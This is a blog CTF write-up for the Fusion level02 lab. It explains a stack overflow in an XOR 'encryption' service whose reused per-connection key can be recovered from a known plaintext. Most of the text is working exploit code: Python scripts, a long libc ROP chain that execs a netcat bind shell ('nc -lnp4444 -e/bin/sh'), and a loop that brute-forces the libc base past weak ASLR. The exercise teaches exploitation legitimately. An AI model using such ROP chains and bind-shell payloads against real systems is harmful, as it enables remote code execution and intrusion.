+++
author = "pwntester"
categories = ["CTF", "Fusion", "exploit", "level02"]
date = 2013-12-30T16:35:00Z
description = ""
draft = false
slug = "fusion-level02-write-up"
tags = ["CTF", "Fusion", "exploit", "level02"]
title = "Fusion level02 write-up"

+++

## Fusion level02
This [level](http://exploit-exercises.com/fusion/level02) has the following protections:

![](/images/octopress/fusion02.png)

And the code looks like:

```lang-clike line-numbers 
#include "../common/common.c"

#define XORSZ 32

void cipher(unsigned char *blah, size_t len)
{
  static int keyed;
  static unsigned int keybuf[XORSZ];

  int blocks;
  unsigned int *blahi, j;

  if(keyed == 0) {
    int fd;
    fd = open("/dev/urandom", O_RDONLY);
    if(read(fd, &keybuf, sizeof(keybuf)) != sizeof(keybuf)) exit(EXIT_FAILURE);
    close(fd);
    keyed = 1;
  }

  blahi = (unsigned int *)(blah);
  blocks = (len / 4);
  if(len & 3) blocks += 1;

  for(j = 0; j < blocks; j++) {
    blahi[j] ^= keybuf[j % XORSZ];
  }
}

void encrypt_file()
{
  // http://thedailywtf.com/Articles/Extensible-XML.aspx
  // maybe make bigger for inevitable xml-in-xml-in-xml ?
  unsigned char buffer[32 * 4096];

  unsigned char op;
  size_t sz;
  int loop;

  printf("[-- Enterprise configuration file encryption service --]\n");

  loop = 1;
  while(loop) {
    nread(0, &op, sizeof(op));
    switch(op) {
      case 'E':
        nread(0, &sz, sizeof(sz));
        nread(0, buffer, sz);
        cipher(buffer, sz);
        printf("[-- encryption complete. please mention "
        "474bd3ad-c65b-47ab-b041-602047ab8792 to support "
        "staff to retrieve your file --]\n");
        nwrite(1, &sz, sizeof(sz));
        nwrite(1, buffer, sz);
        break;
      case 'Q':
        loop = 0;
        break;
      default:
        exit(EXIT_FAILURE);
    }
  }

}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *p;

  background_process(NAME, UID, GID);
  fd = serve_forever(PORT);
  set_io(fd);

  encrypt_file();
}
```

Its easy to spot where we can smash the stack since we can read in "buffer" any arbitrary amount of bytes that we specify with "sz" while "buffer" is only 131072 bytes long.
However, before reaching the end of the "encrypt_file" function where we will take control of the instruction pointer, a call to "cipher" is done on the buffer we control and it will cipher its contents, not just the original 131072 bytes but the same number of bytes that we specified in our package with "sz".
The bad news are that the server uses a new key per connection. The good news are that once the connection is opened, the server reuses the same key for following requests over the same socket.
Since the server uses "xor" to cipher our content and then it sends us the ciphertext, we will be able to figure out the key by simply xoring the plaintext and the ciphertext.

So our plan is to open a connection, send a known plaintext, receive the server response and infere the key. Once we know the key, we will try to overwrite EIP. Lets get the ball running:

```lang-python line-numbers 
s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 20002))

offset = 131072 + 16
payload = "D"*offset
op = "E"
size = pack("<I", len(payload))
print "Sending payload"
s.send(op + size + payload)
s.send("Q")
s.close()
```

We can see our program sigfaulting in a random address as we expected:

```lang-bash line-numbers 
(gdb) c
Continuing.
[New process 8310]

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 8310]
main (argc=Cannot access memory at address 0xd66003b1
) at level02/level02.c:74
74	level02/level02.c: No such file or directory.
	in level02/level02.c
```

We will need a helper function to xor two strings:

```lang-python line-numbers 
def xor_strings(s1,s2):
    print("Xoring strings {0}/{1}".format(len(s1),len(s2)))
    array = []
    i = 0
    for c in s1:
            array.append(chr(ord(c) ^ ord(s2[i])))
            i = i +1
    xored = "".join(array)
    return xored
```

Ok, so our new exploit looks like:

```lang-python line-numbers 
s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 20002))

offset = 131072 + 512
payload = "D"*offset
op = "E"
size = pack("<I", len(payload))
print("Sending payload: {0}".format(offset))
s.send(op + size + payload)
banner_size = len("[-- Enterprise configuration file encryption service --]\n[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n")
print("Skipping banner: " + str(banner_size))
print(s.recv(banner_size))
cipher_size = unpack("<I", s.recv(4))[0]
ciphertext = ""
while(len(ciphertext) < cipher_size):
        ciphertext += s.recv(cipher_size-len(ciphertext))
print("Received a cipher block of {0} bytes ({1})".format(cipher_size, len(ciphertext)))
print("Decryting key")
key = xor_strings(payload, ciphertext)
print("Resending ciphered payload")
s.send(op + size + xor_strings(payload,key))
s.send("Q")
s.close()
```

Lets run it:

```lang-bash line-numbers 
fusion@fusion:~$ python fusion02.py
Sending payload: 131584
Skipping banner: 177
[-- Enterprise configuration file encryption service --]
[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]

Received a cipher block of 131584 bytes (131584)
Decryting key
Xoring strings 131584/131584
Resending ciphered payload
Xoring strings 131584/131584
```

And in gdb we can see the application segfaulting at 0x44444444!!!:

```lang-bash line-numbers 
(gdb) c
Continuing.
[New process 8562]

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 8562]
0x44444444 in ?? ()
```

Now we need to find the exact offset where we overwrite the instruction pointer and generate a ROP payload since the stack is NX.

Trying different offsets we find that the right one is 16.

Now we need to generate a ROP chain using libc gadgets since our binary is too small. The exploit will start a netcat listener for us:

```lang-bash line-numbers 
fusion@fusion:~$ ./ROPgadget/ROPgadget /lib/i386-linux-gnu/libc.so.6 -b 4444
...
...
Unique gadgets found: 76
This binary depends on shared libraries (you might want to check these):
    ld-linux.so.2


Possible combinations.
============================================================

	- 0x0006cc5a => mov DWORD PTR [ecx],eax ; ret
	- 0x000238df => pop eax ; ret
	- 0x00018f4e => pop ebx ; ret
	- 0x000d5c1f => pop edx ; pop ecx ; pop eax ; ret
	- 0x00001a9e => pop edx ; ret
	- 0x000328e0 => xor eax,eax ; ret
	- 0x00026722 => inc eax ; ret
	- .......... => inc %ax
	- .......... => inc %al
	- 0x0002dd35 => int 0x80
	- .......... => sysenter
	- 0x00016cdf => pop ebp ; ret
	- 0x001789c0 => .data Addr
[+] Combo was found!
#!/usr/bin/python
# execve generated by Ropgadget v4.0.3
from struct import pack

p = ''
# Padding goes here

# This ROP Exploit has been generated for a shared object.
# The addresses of the gadgets will need to be adjusted.
# Set this variable to the offset of the shared library
off = 0x0

p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
p += "AAAA" # padding
p += pack("<I", off + 0x001789c0) # @ .data
p += "AAAA" # padding
p += pack("<I", off + 0x000238df) # pop eax ; ret
p += "/usr" # /usr
p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
p += "AAAA" # padding
p += pack("<I", off + 0x001789c4) # @ .data + 4
p += "AAAA" # padding
p += pack("<I", off + 0x000238df) # pop eax ; ret
p += "/bin" # /bin
p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
p += "AAAA" # padding
p += pack("<I", off + 0x001789c8) # @ .data + 8
p += "AAAA" # padding
p += pack("<I", off + 0x000238df) # pop eax ; ret
p += "/net" # /net
p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
p += "AAAA" # padding
p += pack("<I", off + 0x001789cc) # @ .data + 12
p += "AAAA" # padding
p += pack("<I", off + 0x000238df) # pop eax ; ret
p += "catA" # catA
p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
p += "AAAA" # padding
p += pack("<I", off + 0x001789cf) # @ .data + 15
p += "AAAA" # padding
p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
p += "AAAA" # padding
p += pack("<I", off + 0x001789d0) # @ .data + 16
p += "AAAA" # padding
p += pack("<I", off + 0x000238df) # pop eax ; ret
p += "-ltp" # -ltp
p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
p += "AAAA" # padding
p += pack("<I", off + 0x001789d4) # @ .data + 20
p += "AAAA" # padding
p += pack("<I", off + 0x000238df) # pop eax ; ret
p += "4444" # 4444
p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
p += "AAAA" # padding
p += pack("<I", off + 0x001789d8) # @ .data + 24
p += "AAAA" # padding
p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
p += "AAAA" # padding
p += pack("<I", off + 0x001789d9) # @ .data + 25
p += "AAAA" # padding
p += pack("<I", off + 0x000238df) # pop eax ; ret
p += "-e/b" # -e/b
p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
p += "AAAA" # padding
p += pack("<I", off + 0x001789dd) # @ .data + 29
p += "AAAA" # padding
p += pack("<I", off + 0x000238df) # pop eax ; ret
p += "in/s" # in/s
p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
p += "AAAA" # padding
p += pack("<I", off + 0x001789e1) # @ .data + 33
p += "AAAA" # padding
p += pack("<I", off + 0x000238df) # pop eax ; ret
p += "hAAA" # hAAA
p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
p += "AAAA" # padding
p += pack("<I", off + 0x001789e2) # @ .data + 34
p += "AAAA" # padding
p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
p += "AAAA" # padding
p += pack("<I", off + 0x001789e3) # @ .data + 35
p += "AAAA" # padding
p += pack("<I", off + 0x000238df) # pop eax ; ret
p += pack("<I", off + 0x001789c0) # @ .data
p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
p += "AAAA" # padding
p += pack("<I", off + 0x001789e7) # @ .data + 39
p += "AAAA" # padding
p += pack("<I", off + 0x000238df) # pop eax ; ret
p += pack("<I", off + 0x001789d0) # @ .data + 16
p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
p += "AAAA" # padding
p += pack("<I", off + 0x001789eb) # @ .data + 43
p += "AAAA" # padding
p += pack("<I", off + 0x000238df) # pop eax ; ret
p += pack("<I", off + 0x001789d9) # @ .data + 25
p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
p += "AAAA" # padding
p += pack("<I", off + 0x001789ef) # @ .data + 47
p += "AAAA" # padding
p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
p += pack("<I", off + 0x00018f4e) # pop ebx ; ret
p += pack("<I", off + 0x001789c0) # @ .data
p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
p += "AAAA" # padding
p += pack("<I", off + 0x001789e3) # @ .data + 35
p += "AAAA" # padding
p += pack("<I", off + 0x00001a9e) # pop edx ; ret
p += pack("<I", off + 0x001789ef) # @ .data + 47
p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
p += pack("<I", off + 0x00026722) # inc eax ; ret
p += pack("<I", off + 0x00026722) # inc eax ; ret
p += pack("<I", off + 0x00026722) # inc eax ; ret
p += pack("<I", off + 0x00026722) # inc eax ; ret
p += pack("<I", off + 0x00026722) # inc eax ; ret
p += pack("<I", off + 0x00026722) # inc eax ; ret
p += pack("<I", off + 0x00026722) # inc eax ; ret
p += pack("<I", off + 0x00026722) # inc eax ; ret
p += pack("<I", off + 0x00026722) # inc eax ; ret
p += pack("<I", off + 0x00026722) # inc eax ; ret
p += pack("<I", off + 0x00026722) # inc eax ; ret
p += pack("<I", off + 0x0002dd35) # int 0x80
print p
```

If we run our exploit with the ROP payload we get the following segmentation fault:

```lang-bash line-numbers 
Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
```

Here I spent a lot of time debugging the ROP payload. The basics were ok. The ROP chain copies some strings in memory and then it sets the registers to call "execve" syscall. I set up a breakpoint just before the "int 80" opcode and check that everything was ok but I wasnt getting the netcat listener. After some time I realize how stupid I was. The auto generated chain was invoking:

```lang-bash line-numbers 
/usr/bin/netcat -ltp4444 -e/bin/sh
```

The netcat version available in my machine was: "/bin/nc"

In addition "-t" was not a valid argument. Since I didnt want to generate another chain (since I already debug that one and was pretty sure it was ok) I just changed the strings to invoke:

```lang-bash line-numbers 
/////bin/////nc -lnp4444 -e/bin/sh
```

For the first exploit version I just cheated and got the libc base from /proc/<pid>/maps but for the final version I added a bruteforce loop since the randomization is very weak and it only affect 12 bits.

The final exploit was:

```lang-python line-numbers 
#!/usr/bin/python

from socket import *
from struct import *

def xor_strings(s1,s2):
        #print("Xoring strings {0}/{1}".format(len(s1),len(s2)))
        array = []
        i = 0
        for c in s1:
                array.append(chr(ord(c) ^ ord(s2[i])))
                i = i +1
        xored = "".join(array)
        return xored

for off in range(0xb7000000, 0xb8000000, 0x1000):
        p = ''

        # This ROP Exploit has been generated for a shared object.
        # The addresses of the gadgets will need to be adjusted.
        # Set this variable to the offset of the shared library
        #off = 0xb7623000  # First version libc base
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789c0) # @ .data
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "////" # /usr
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789c4) # @ .data + 4
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "/bin" # /bin
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789c8) # @ .data + 8
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "////" # /net
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789cc) # @ .data + 12
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "/ncA" # catA
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789cf) # @ .data + 15
        p += "AAAA" # padding
        p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789d0) # @ .data + 16
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "-lnp" # -lnp
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789d4) # @ .data + 20
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "4444" # 4444
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789d8) # @ .data + 24
        p += "AAAA" # padding
        p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789d9) # @ .data + 25
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "-e/b" # -e/b
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789dd) # @ .data + 29
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "in/s" # in/s
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789e1) # @ .data + 33
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "hAAA" # hAAA
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789e2) # @ .data + 34
        p += "AAAA" # padding
        p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        # hasta aqui:
        #(gdb) x/3s 0xb75e1000 + 0x001789c0
        #0xb77599c0 <map>:       "/usr/bin/netcat"
        #0xb77599d0 <buf>:       "-ltp4444"
        #0xb77599d9 <buffer+1>:  "-e/bin/sh"
        # 73
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789e3) # @ .data + 35
        p += "AAAA" # padding
        # ecx -> .data despues de ultimo argumento
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += pack("<I", off + 0x001789c0) # @ .data
        # eax -> cadena comanddo
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        # mete la direccion del comando en data + 35
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789e7) # @ .data + 39
        p += "AAAA" # padding
        # ecx -> data + 39
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += pack("<I", off + 0x001789d0) # @ .data + 16
        # eax -> direccion primer argumento
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        # ecx -> mete la direccion del primer argumento en data + 39
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789eb) # @ .data + 43
        p += "AAAA" # padding
        # ecx -> data +43
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += pack("<I", off + 0x001789d9) # @ .data + 25
    	# eax -> direccion segundo parametro
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        # mete la direccion del segundo parametro en data + 43
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789ef) # @ .data + 47
        p += "AAAA" # padding
        p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        # mete en 0 en data + 47
        p += pack("<I", off + 0x00018f4e) # pop ebx ; ret
        p += pack("<I", off + 0x001789c0) # @ .data
        # mete direccion del comando en ebx
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789e3) # @ .data + 35
        p += "AAAA" # padding
        # mete direccion donde esta la direccion del comando en ecx
        p += pack("<I", off + 0x00001a9e) # pop edx ; ret
        p += pack("<I", off + 0x001789ef) # @ .data + 47
        # mete direccion de 0 en edx
        p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x0002dd35) # int 0x80

        s = socket(AF_INET, SOCK_STREAM)
        s.connect(("localhost", 20002))
        #print("Trying libc base: " + str(hex(off)))
        offset = 16
        payload = "A"*(131072 + offset) + p
        op = "E"
        size = pack("<I", len(payload))
        #print("Sending payload: " + str(len(payload)))
        s.send(op + size + payload)
        banner_size = len("[-- Enterprise configuration file encryption service --]\n[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n")
        #print("Skipping banner: " + str(banner_size))
        s.recv(banner_size)
        cipher_size = unpack("<I", s.recv(4))[0]
        #print("Cipher size: " + str(cipher_size))
        ciphertext = ""
        while(len(ciphertext) < cipher_size):
                ciphertext += s.recv(cipher_size-len(ciphertext))
        #print("Received a cipher block of {0} bytes ({1})".format(cipher_size, len(ciphertext)))
        #print("Decryting key")
        key = xor_strings(payload, ciphertext)
        #print("Resending ciphered payload")
        s.send(op + size + xor_strings(payload,key))
        s.send("Q")
        s.close()
```

In my shity VM, it took around 5mins to brute force it although the listener was up within the first 2 mins:

```lang-bash line-numbers 
fusion@fusion:~$ time python fusion02.py

real	5m28.087s
user	5m22.504s
sys	0m2.724s
```

And the listener is waiting for us:

```lang-bash line-numbers 
fusion@fusion:~$ sudo netstat -natp | grep LISTEN
tcp        0      0 0.0.0.0:20002           0.0.0.0:*               LISTEN      1017/level02
tcp        0      0 0.0.0.0:20003           0.0.0.0:*               LISTEN      1005/level03
tcp        0      0 0.0.0.0:20004           0.0.0.0:*               LISTEN      1002/level04
tcp        0      0 0.0.0.0:20005           0.0.0.0:*               LISTEN      963/level05
tcp        0      0 0.0.0.0:20006           0.0.0.0:*               LISTEN      870/level06
tcp        0      0 0.0.0.0:20008           0.0.0.0:*               LISTEN      837/level08
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      691/sshd
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      7159/nc
tcp        0      0 0.0.0.0:20000           0.0.0.0:*               LISTEN      1047/level00
tcp        0      0 0.0.0.0:20001           0.0.0.0:*               LISTEN      1031/level01
tcp6       0      0 :::22                   :::*                    LISTEN      691/sshd
fusion@fusion:~$ nc localhost 4444
id
uid=20002 gid=20002 groups=20002
```




